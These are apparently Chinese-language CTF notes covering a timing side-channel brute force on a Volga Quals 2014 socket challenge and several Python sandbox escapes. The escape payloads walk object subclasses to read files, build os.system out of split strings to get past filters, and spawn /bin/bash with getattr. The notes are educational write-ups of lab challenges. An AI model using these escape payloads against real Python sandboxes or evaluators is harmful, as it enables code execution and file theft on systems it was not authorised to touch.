# volga quals 2014 - Notes

## 100

先用 IDA 看 Code 是 socket programming

沒學過，簡單紀錄一下

相關可看 [socket.h](http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html)

```c
int socket(int domain, int type, int protocol);
這裡是
socketfd = socket(2, 1, 0)
// 2 = AF_INET , Internet IP Protocol
// 1 = SOCK_STREAM
// 0 = 讓kernel 設定對應 type 的默認 protocol

htons(port) ; ## 以這題來看是 7026
```

簡單講，啟動 ./server 後，可以 nc localhost 7026 過去

關鍵函數看 serve()

輸入需要長度是 12 ，正確印出 flag

可以看一下

```
while ( 1 )
  {
    do
    {
      read(fd, user_keyin, 15u);
      user_keyin[12] = 0;
    }
    while ( strlen(user_keyin) != 12 );
    v5 = 0;
    for ( i = 0; i <= 11; ++i )
    {
      if ( passwd[i] == user_keyin[i] )
        ++v5;
    }
    if ( v5 == 12 )
      break;
    v7 = rand() % 1000;
    for ( j = 0; j < v5; ++j )
    {
      for ( k = 1; k <= 0xDEADBEEE; ++k )
        v7 = k ^ (k + v7);
    }
    sprintf(&s, "%x\n", v7);
    write(fd, &s, strlen(&s));
  }
  write(fd, flag, strlen(flag));
```

簡單講就是如果有一個密碼匹配就會將 v5 + 1

那他去計算 v7 的長度是 0xdeadbeee << 這非常大

代表我們可以利用時間差去攻擊

第一次輸入
111111111111

瞬間回復代表沒一個中，之後輸入

a11111111111 

如果卡很久就知道第一個密碼是 a

之後改成輸入
1a1111111111 

這樣來判斷第二個密碼，可以慢慢把答案 leak 出來

```python
#!/usr/bin/env python
from pwn import *
import string
allword = string.printable
fake_pw = 'gggggggggggg'
pw = 'password: '
count = 0
while True:
	r = remote('127.0.0.1', 7026)
	r.recvline()
	for i in allword:
		fake = fake_pw[:count] + i + fake_pw[count+1:]
		print "now send:",fake
		r.sendline(fake)
		a = r.recvrepeat(0.4)
		if len(a) == 0:
			pw += i 
			count += 1
			print pw
			r.close
			break
		print "now a:",repr(a),len(a)
	if count == 12:
		break
```

## 300

隨便亂輸入會得到 "Exception: name 'asd' is not defined"

拿去 google 可以知道是 python 

然後目標是讀取其家目錄的 FLAG

相關Write up 參考
[參考 1](http://sigint.ru/writeups/2014/04/07/volga-ctf-2014-writeups/#exploits-300)
[參考 2](https://ctftime.org/writeup/1025)

如果沒任何過濾的題目，可以直接 

import os
os.system(' cat flag ') 

有過濾下，可以利用 file object 去讀檔案

```
In [1]: ().__class__
Out[1]: tuple

In [2]: ().__class__.__bases__
Out[2]: (object,)

In [3]: ().__class__.__bases__[0]
Out[3]: object

n [4]: ().__class__.__bases__[0].__subclasses__()
Out[4]: 
[type,
 weakref,
 weakcallableproxy,
 weakproxy,
 int,
 basestring,
 bytearray,
 list,
 NoneType,
 NotImplementedType,
 traceback,
 super,
 xrange,
....
....

In [5]: ().__class__.__bases__[0].__subclasses__()[40]
Out[5]: file

## file 在第 40 個

In [8]: ().__class__.__bases__[0].__subclasses__()[40]('/tmp/p/flag.txt','r').read()
Out[8]: 'The flag is i_l0ve_marS'
```


延伸學習~~ ，底下是網路上找到的不知是哪裡的題目，不會返回指令的結果

```python
#!/usr/bin/env python
from __future__ import print_function

print("Welcome to my Python sandbox! Enter commands below!")

banned = [ 
"import", 
"exec", 
"eval", 
"pickle", 
"os", 
"subprocess", 
"kevin sucks", 
"input", 
"banned", 
"cry sum more", 
"sys"
] 

targets = __builtins__.__dict__.keys() 
targets.remove('raw_input') 
targets.remove('print') 
for x in targets: 
	del __builtins__.__dict__[x] 
	while 1:
		print(">>>", end=' ') 
		data = raw_input() 
		for no in banned:
			if no.lower() in data.lower(): 
				print("No bueno")
				break
			else: # this means nobreak
				exec data
```

這裡使用的是 object 的第 59 個 catchwarning

```python
In [8]: ().__class__.__bases__[0].__subclasses__()[59]
Out[8]: warnings.catch_warnings
```

payload

```python
 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['s'+'ystem']('ls')
```



延伸學習 ~ 中國2017 胖哈勃杯第十三届CUIT校赛


題目
```
#!/usr/bin/python3
import sys, cmd, os

del __builtins__.__dict__['__import__']
del __builtins__.__dict__['eval']

intro = """
Welcome to Secure Python Interpreter 
================================================

Rules:
    -Do not import anything
    -No peeking at files!
    -No sharing of flags :)

"""


def execute(command):
       exec(command, globals())
 
class Jail(cmd.Cmd):
 
    prompt     = '>>> '
    filtered    = '\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'.split('|')
 
    def do_EOF(self, line):
        sys.exit()
 
    def emptyline(self):
        return cmd.Cmd.emptyline(self)
 
    def default(self, line):
        sys.stdout.write('\x00')
 
    def postcmd(self, stop, line):
        if any(f in line for f in self.filtered):
            print("Do you think my code is so insecure ?")
            print("You can never get out of my jail :)")
        else:
           try:
                execute(line)
           except NameError:
                print("NameError: name '%s' is not defined" % line)
           except Exception:
                print("Error: %s" % line)
        return cmd.Cmd.postcmd(self, stop, line)
 
if __name__ == "__main__":
    try:
        Jail().cmdloop(intro)
    except KeyboardInterrupt:
        print("\rBye bye !")
```

可以先看有哪些 import 進來，然後 . 被過濾了

```
>>> print(dir())
['Jail', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'cmd', 'execute', 'intro', 'os', 'sys']
>>> os
>>> os.system
Do you think my code is so insecure ?
You can never get out of my jail :)
```

然後這題的 trick 是利用 getattr 去開 shell

```
print(getattr(os, "system")("/bin/bash"))
```

getattr(os, 'system') 等同於 os.system



